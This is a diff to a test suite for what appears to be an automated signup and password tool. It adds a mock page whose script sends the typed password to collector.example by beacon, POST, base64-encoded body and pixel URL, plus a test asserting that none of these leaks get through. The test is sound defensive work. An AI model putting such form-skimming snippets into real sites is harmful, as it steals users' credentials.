@@ -225,6 +225,26 @@ const PAGES: Record<string, string> = {
     "document.getElementById('join').addEventListener('submit', (event) => { event.preventDefault(); send(); });",
     '/api/slow-signup',
   )}`,
+  // The site's own handler posts to its own host; a third-party script on it copies the new password elsewhere.
+  '/collecting-signup': `<h1>Join</h1><form id="join">${signupFields}<button type="submit">Create account</button></form><div id="result"></div><script>
+    const form = document.getElementById('join');
+    const password = form.querySelector('[name=password]');
+    password.addEventListener('input', () => navigator.sendBeacon('https://collector.example/typed', password.value));
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      const value = password.value;
+      navigator.sendBeacon('https://collector.example/beacon', JSON.stringify({ field: value }));
+      fetch('https://collector.example/collect', { method: 'POST', mode: 'no-cors', body: value }).catch(() => {});
+      fetch('https://collector.example/encoded', { method: 'POST', mode: 'no-cors', body: btoa(value) }).catch(() => {});
+      fetch('https://collector.example/pixel?p=' + encodeURIComponent(value), { mode: 'no-cors' }).catch(() => {});
+      await fetch('https://collector.example/cdn/app.js', { mode: 'no-cors' }).catch(() => {});
+      // An invisible captcha checks with its own site as the form submits, and the signup waits for it.
+      const verified = await fetch('https://captcha.example/verify', { method: 'POST', mode: 'no-cors', body: 'token=widget-token' }).then(() => true, () => false);
+      if (!verified) return;
+      const response = await fetch('/api/signup', { method: 'POST', body: new URLSearchParams(new FormData(form)) });
+      document.getElementById('result').innerHTML = await response.text();
+    });
+  </script>`,
   '/verify-email': '<h1>Your email has been verified.</h1><p>Your account is ready.</p>',
   '/verify-email-quiet': '<h1>Shop</h1><p>Browse the catalogue.</p>',
 };
@@ -374,7 +394,11 @@ describe.skipIf(!chromePath)('native authorized signup and password change', { t
       socket.once('close', () => sockets.delete(socket));
     });
     proxy.on('connect', (request, socket, head) => {
-      if (!['accounts.shop.example:443', 'parent.example:443', 'collector.example:443'].includes(request.url ?? '')) {
+      if (
+        !['accounts.shop.example:443', 'parent.example:443', 'collector.example:443', 'captcha.example:443'].includes(
+          request.url ?? '',
+        )
+      ) {
         socket.destroy();
         return;
       }
@@ -937,6 +961,27 @@ describe.skipIf(!chromePath)('native authorized signup and password change', { t
     expect(result).toEqual({ status: 'outcome_unknown' });
     expect(posts.filter((post) => post.host === 'collector.example')).toEqual([]);
     expect(await attempts.get(authority.id)).toMatchObject({ phase: 'unknown' });
+  }, 30_000);
+
+  it("keeps a generated password off other sites while the page's captcha and CDN requests still go", async () => {
+    const { result, password } = await signUp('/collecting-signup', SIGNUP);
+    expect(posts.filter((post) => post.host === 'collector.example')).toEqual([]);
+    expect(posts).toEqual([
+      { host: 'captcha.example', path: '/verify', body: 'token=widget-token' },
+      {
+        host: 'accounts.shop.example',
+        path: '/api/signup',
+        body: new URLSearchParams({
+          email: USERNAME,
+          password: password!,
+          password_confirmation: password!,
+        }).toString(),
+      },
+    ]);
+    expect(addresses.filter((address) => address.startsWith('collector.example'))).toEqual([
+      'collector.example/cdn/app.js',
+    ]);
+    expect(result).toEqual({ status: 'account_created' });
   }, 30_000);
 
   describe('website outcomes', () => {
